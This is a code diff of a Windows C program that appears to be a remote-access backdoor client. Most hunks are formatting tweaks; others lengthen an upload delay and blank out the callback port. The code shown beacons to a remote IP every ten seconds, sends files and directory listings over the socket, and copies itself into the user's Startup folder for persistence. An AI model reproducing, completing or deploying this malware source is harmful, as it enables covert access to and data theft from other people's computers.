@@ -40,7 +40,7 @@ int wsa_soc_con( char* IP, int port )
 
     int conResult = connect(sock, (SOCKADDR*)&hint, sizeof(hint));
     
-    if ( conResult == SOCKET_ERROR ){
+    if ( conResult == SOCKET_ERROR ) {
         closesocket(sock);
         WSACleanup();
         return 1;
@@ -50,14 +50,14 @@ int wsa_soc_con( char* IP, int port )
 }
 
 
-int check_path( char* path ){
+int check_path( char* path ) {
     WIN32_FIND_DATA fdfile;
     HANDLE hfind = NULL;
 
     char newpath[2049];
     sprintf(newpath, "%s\\*.*", path);
 
-    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ){
+    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ) {
         return 1;
     }
 
@@ -66,7 +66,7 @@ int check_path( char* path ){
     return 0;
 }
 
-void get_disk(){
+void get_disk() {
 
     char* letters[26] = {
         "A:", "B:", "C:", "D:", "E:", 
@@ -167,7 +167,7 @@ int upload_file( char* filename, SOCKET sock ) {
     }
 
     send(sock, filename, strlen(filename) + 1, 0);
-    Sleep(3000); 
+    Sleep(5000); 
     while ( fread(buffer, sizeof(buffer), 1, fptr) > 0 ) {
         send(sock, buffer, sizeof(buffer), 0);
     }
@@ -184,12 +184,10 @@ int ls_dir( SOCKET sock ) {
     int sendRes;
     int byteRecvd;
 
-
     WIN32_FIND_DATA fdfile;
     HANDLE hfind;
     TCHAR Buffer[BUFSIZE];
     DWORD dwRet;
-
     
     dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
     if( dwRet == 0 )
@@ -200,7 +198,7 @@ int ls_dir( SOCKET sock ) {
     char newpath[2048];
     sprintf(newpath, "%s\\*.*", Buffer);
     
-    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ){
+    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ) {
         return 1;
     }
 
@@ -246,7 +244,7 @@ int pwd( SOCKET sock ) {
 }
 
 
-int first_word( char* found, char* command ){
+int first_word( char* found, char* command ) {
     int size = strlen(found);
 
     if ( size >= strlen(command) ) {
@@ -280,7 +278,7 @@ void ClientSoc( char* IP , int port ) {
     while (1) {
         Sleep(10000);
 
-        if ( wsa_soc_con(IP, port) != 0 ){
+        if ( wsa_soc_con(IP, port) != 0 ) {
             continue;
         }
         
@@ -428,7 +426,7 @@ int main( int argc, char* argv[] ) {
     
     
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (iResult != 0) {
+    if ( iResult != 0 ) {
         return 1;
     }
 
@@ -461,7 +459,7 @@ int main( int argc, char* argv[] ) {
     }
 
     char* IP = inet_ntoa(addr);
-    int PORT = 9999;
+    int PORT = 0000;
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
@@ -487,7 +485,7 @@ int main( int argc, char* argv[] ) {
         
         sprintf(path_name, "%s%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", current_exe);
         
-        if (is_file_exist(path_name) != 0) {
+        if ( is_file_exist(path_name) != 0 ) {
             to_startup(path, argv[0], path_name);
         }
     }
